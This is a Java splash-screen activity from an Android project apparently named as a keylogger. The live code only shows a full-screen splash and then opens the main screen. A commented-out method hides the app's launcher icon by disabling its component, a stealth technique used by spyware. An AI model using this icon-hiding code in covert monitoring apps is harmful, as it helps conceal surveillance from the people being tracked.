package com.mr.programmerlab.androidkeylogger;

import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.Handler;
import android.view.WindowManager;

import androidx.appcompat.app.AppCompatActivity;

import mr.programmerlab.androidkeylogger.R;

public class Splash extends AppCompatActivity {
    public static int SPLASH_SCREEN_TIME_OUT=2000;
    @Override
    protected void onCreate(Bundle savedInstanceState) {

        super.onCreate(savedInstanceState);
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN, WindowManager.LayoutParams.FLAG_FULLSCREEN);
        setContentView(R.layout.splash);
        new Handler().postDelayed(new Runnable() {
            @Override
            public void run() {
                if (!AppConfig.activity) {
                    Intent intent = new Intent();
                    intent.setClass(Splash.this, MainActivity.class);
                    startActivity(intent);
                    Splash.this.finish();
                }
                if (AppConfig.activity) {

                    Intent intent = new Intent();
                    intent.setClass(Splash.this, MainActivity.class);
                    startActivity(intent);
                    finish();
                }
            }
        }, SPLASH_SCREEN_TIME_OUT);
    }

//    public void appLogo(boolean b){
//        if(b){
//            PackageManager p = getPackageManager();
//            ComponentName componentName = new ComponentName(Splash.this, Splash.class);
//            p.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
//        }
//        if(!b){
//            PackageManager p = getPackageManager();
//            ComponentName componentName = new ComponentName(Splash.this, Splash.class);
//            p.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
//        }
//    }
}
